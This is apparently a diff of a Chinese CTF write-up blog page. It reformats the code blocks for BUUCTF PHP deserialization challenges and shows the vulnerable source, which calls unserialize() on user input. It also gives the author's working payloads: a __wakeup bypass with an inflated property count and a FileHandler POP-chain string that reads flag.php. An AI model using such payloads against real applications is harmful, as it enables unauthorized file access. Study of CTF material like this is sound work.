@@ -24,7 +24,7 @@
 <meta property="og:description" content="审计&amp;HTTP&amp;正则[HCTF 2018]WarmUp(代码审计)源代码&#x3D;&#x3D;&gt;source.php&#x3D;&#x3D;&#x3D;&gt;hint.php&#x3D;&#x3D;&gt;flag not here, and flag in ffffllllaaaagggg&#x3D;&#x3D;&gt;说明flag可能在文件ffffllllaaaagg">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2024-04-14T13:42:14.577Z">
-<meta property="article:modified_time" content="2024-04-25T13:10:21.473Z">
+<meta property="article:modified_time" content="2024-05-02T06:11:35.697Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
   
@@ -422,38 +422,12 @@ if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;
 <p>进行序列化得到O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p>
 <h2 id="极客大挑战-2019-PHP（反序列化）"><a href="#极客大挑战-2019-PHP（反序列化）" class="headerlink" title="[极客大挑战 2019]PHP（反序列化）"></a>[极客大挑战 2019]PHP（反序列化）</h2><p>备份网站&#x3D;&#x3D;&gt;dirsezrch -u <a target="_blank" rel="noopener" href="http://ae4f66fd-39d2-4ca2-93f2-e3b29093f58c.node5.buuoj.cn:81/==%3Ewww.zip%E6%96%87%E4%BB%B6(%E7%9B%B4%E6%8E%A5%E5%9C%A8url%E7%BD%91%E5%9D%80%E5%90%8E%E9%9D%A2%E6%8B%BC%E6%8E%A5%E5%B0%B1%E5%8F%AF%E4%BB%A5)">http://ae4f66fd-39d2-4ca2-93f2-e3b29093f58c.node5.buuoj.cn:81/==&gt;www.zip文件(直接在url网址后面拼接就可以)</a></p>
 <p>文件夹源码挨个看</p>
-<p>index.php<br><code>&lt;?php</code></p>
-<p>  <code>include &#39;class.php&#39;;</code></p>
-<p>  <code>$select = $_GET[&#39;select&#39;];</code></p>
-<p>  <code>$res=unserialize(@$select);</code></p>
-<p>  <code>?&gt;</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">index.php<br><span class="hljs-meta">&lt;?php</span><br><br>  <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;class.php&#x27;</span>;<br><br>  <span class="hljs-variable">$select</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;select&#x27;</span>];<br><br>  <span class="hljs-variable">$res</span>=<span class="hljs-title function_ invoke__">unserialize</span>(@<span class="hljs-variable">$select</span>);<br><br>  <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
 <p>class.php(经过删减)</p>
-<p>&lt;<code>?php</code></p>
-<p><code>include &#39;flag.php&#39;;</code></p>
-<p><code>class Name&#123;</code></p>
-<p>  <code>private $username = &#39;nonono&#39;;</code></p>
-<p><code>private $password = &#39;yesyes&#39;;</code></p>
-<p><code>public function __construct($username,$password)&#123;</code></p>
-<p>​    <code>$this-&gt;username = $username;</code></p>
-<p>​    <code>$this-&gt;password = $password; &#125;</code></p>
-<p> <code>function __wakeup()&#123;</code></p>
-<p>​    <code>$this-&gt;username = &#39;guest&#39;;</code></p>
-<p>  <code>&#125;</code></p>
-<p> <code>function __destruct()&#123;</code></p>
-<p>​    <code>if ($this-&gt;password != 100) &#123;</code></p>
-<p>​      <code>echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;</code></p>
-<p>​      <code>echo &quot;You name is: &quot;;</code></p>
-<p>​      <code>echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;</code></p>
-<p>​      <code>echo &quot;You password is: &quot;;</code></p>
-<p>​      <code>echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;</code></p>
-<p>​      <code>die();</code></p>
-<p>​    <code>&#125;</code></p>
-<p>​    <code>if ($this-&gt;username === &#39;admin&#39;) &#123;</code></p>
-<p>​      <code>global $flag;</code></p>
-<p>​      <code>echo $flag;</code></p>
-<p>​    <code>&#125;else&#123;</code></p>
-<p>​      <code>echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&quot;;</code></p>
-<p>​      <code>die();</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;nonono&#x27;</span>;<br><br><span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;yesyes&#x27;</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br><br>​    <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br><br>​    <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>; &#125;<br><br> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>​    <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-string">&#x27;guest&#x27;</span>;<br><br>  &#125;<br><br> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>​    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;password != <span class="hljs-number">100</span>) &#123;<br><br>​      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;<br><br>​      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You name is: &quot;</span>;<br><br>​      <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;username;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br><br>​      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You password is: &quot;</span>;<br><br>​      <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;password;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br><br>​      <span class="hljs-keyword">die</span>();<br><br>​    &#125;<br><br>​    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;username === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br><br>​      <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br><br>​      <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br><br>​    &#125;<span class="hljs-keyword">else</span>&#123;<br><br>​      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;<br><br>​      <span class="hljs-keyword">die</span>();<br></code></pre></td></tr></table></figure>
+
+<p>&#96;</p>
 <p>**在反序列化时，当前属性个数大于实际属性个数时，就会跳过__wakeup(),去执行___destruct<br>思路明确了</p>
 <p>当password为100，username为admin时即可获得flag</p>
 <p>故以get传参为跳板本地构造原始POC：</p>
@@ -463,25 +437,7 @@ if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;
 <p>?select&#x3D;O:4:”Name”:3 {s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;s:3:”100”;}</p>
 <h2 id="网鼎杯-2020-青龙组-AreUSerialz（反序列化）"><a href="#网鼎杯-2020-青龙组-AreUSerialz（反序列化）" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz（反序列化）"></a>[网鼎杯 2020 青龙组]AreUSerialz（反序列化）</h2><p>构造POP链</p>
 <p>不使用题目中原有的各个字段的protect属性，因为这样会使得序列化后的字符串出现不可打印字符，而题目中的is_valid()函数又会检验输入的字符串中是否有不可打印字符，因此，我们这里把protect属性修改为public。</p>
-<?php
-
-class FileHandler {
-
-  public $op=2;
-
-  public $filename="./flag.php";
-
-  public $content;
-
-  }
-
-$a=new FileHandler;
-
-$str1=serialize($a);
-
-echo $str1;
-
-?>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$op</span>=<span class="hljs-number">2</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>=<span class="hljs-string">&quot;./flag.php&quot;</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>;<br><br>  &#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileHandler</span>;<br><br><span class="hljs-variable">$str1</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$str1</span>;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>O:11:”FileHandler”:3:{s:2:”op”;i:2;s:8:”filename”;s:10:”.&#x2F;flag.php”;s:7:”content”;N;}</p>
 <p>payload： ?str&#x3D;O:11:”FileHandler”:3:{s:2:”op”;i:2;s:8:”filename”;s:10:”.&#x2F;flag.php”;s:7:”content”;N;}</p>
